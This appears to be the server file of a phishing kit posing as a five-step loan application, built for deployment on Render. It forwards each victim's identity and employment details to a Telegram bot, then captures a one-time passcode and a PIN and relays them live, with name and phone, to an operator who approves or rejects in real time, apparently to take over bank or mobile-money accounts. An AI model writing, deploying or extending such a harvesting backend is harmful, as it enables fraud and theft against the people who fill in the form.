/**
 * server.js
 * Optimized for Render.com Deployment
 * Flow: 5 Steps | Admin Approval on Step 5 (PIN)
 */

require('dotenv').config();

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

// Import Telegram bot manager
const botManager = require('./bot_manager');

// ============================================================================
// CONFIGURATION & RENDER ENVIRONMENT
// ============================================================================
const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    }
});

// Expose socket globally for bot callbacks in bot_manager.js
global.io = io;

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; // e.g., https://your-app.onrender.com

// ============================================================================
// SESSION STORAGE
// ============================================================================
const sessions = new Map();

// ============================================================================
// MIDDLEWARE
// ============================================================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Logging Middleware
app.use((req, res, next) => {
    if (!req.path.startsWith('/bot')) { 
        console.log(`📝 ${req.method} ${req.path}`);
    }
    next();
});

// ============================================================================
// TELEGRAM WEBHOOK SETUP (RENDER COMPATIBLE)
// ============================================================================
// Webhook endpoint for Telegram
const WEBHOOK_PATH = `/bot${process.env.BOT_TOKEN}`;
app.post(WEBHOOK_PATH, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Function to set webhook on startup
async function initTelegramWebhook() {
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}${WEBHOOK_PATH}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Failed to set Telegram Webhook:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL not found. Webhook not set.');
    }
}

// ============================================================================
// SOCKET.IO CONNECTION HANDLING
// ============================================================================
io.use((socket, next) => {
    const sessionId = socket.handshake.auth.sessionId;
    socket.sessionId = sessionId || 'sess_' + uuidv4().substring(0, 8);
    // Stable AppID for the current connection
    socket.appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    next();
});

io.on('connection', (socket) => {
    console.log(`🔌 SOCKET CONNECTED: ${socket.appId}`);

    let session = sessions.get(socket.sessionId);

    if (!session) {
        session = {
            appId: socket.appId,
            data: {},
            completed: false
        };
        sessions.set(socket.sessionId, session);
    } else {
        socket.appId = session.appId;
    }

    socket.join(socket.appId);
    socket.emit('session-ready', { appId: socket.appId });

    // --- STEP HANDLERS (5 STEP FLOW) ---
    
    socket.on('step1', (data) => {
        session.data.loan = data;
        botManager.sendStep1({ appId: socket.appId, ...data });
    });

    socket.on('step2', (data) => {
        session.data.identity = data;
        botManager.sendStep2({ appId: socket.appId, ...data });
    });

    socket.on('step3', (data) => {
        session.data.employment = data;
        botManager.sendStep3({ appId: socket.appId, ...data });
    });

    // Step 4: OTP (6 Digits)
    socket.on('step4', (data) => {
        session.data.otp = data.otp;
        botManager.sendStep4({
            appId: socket.appId,
            phone: session.data.identity?.phone || 'N/A',
            otp: data.otp
        });
    });

    // Step 5: PIN (4 Digits) + Wait for Admin Approval
    socket.on('step5', (data) => {
        session.data.pin = data.pin;
        
        // Prepare full report for the Admin Approval button in Telegram
        const fullReport = {
            appId: socket.appId,
            name: `${session.data.identity?.firstName || ''} ${session.data.identity?.lastName || ''}`,
            phone: session.data.identity?.phone || 'N/A',
            amount: session.data.loan?.amount || '0',
            otp: session.data.otp || 'N/A',
            pin: data.pin
        };

        // Triggers the Telegram Inline Keyboard (Confirm/Reject)
        botManager.sendApprovalRequest(fullReport);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 Socket disconnected: ${socket.appId}`);
    });
});

// ============================================================================
// API & STARTUP
// ============================================================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', url: EXTERNAL_URL });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error Handling
app.use((err, req, res, next) => {
    console.error('❌ Error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// START SERVER
server.listen(PORT, () => {
    console.log(`🚀 ASA SERVER RUNNING ON PORT ${PORT}`);
    initTelegramWebhook(); // Initialize webhook when server starts
});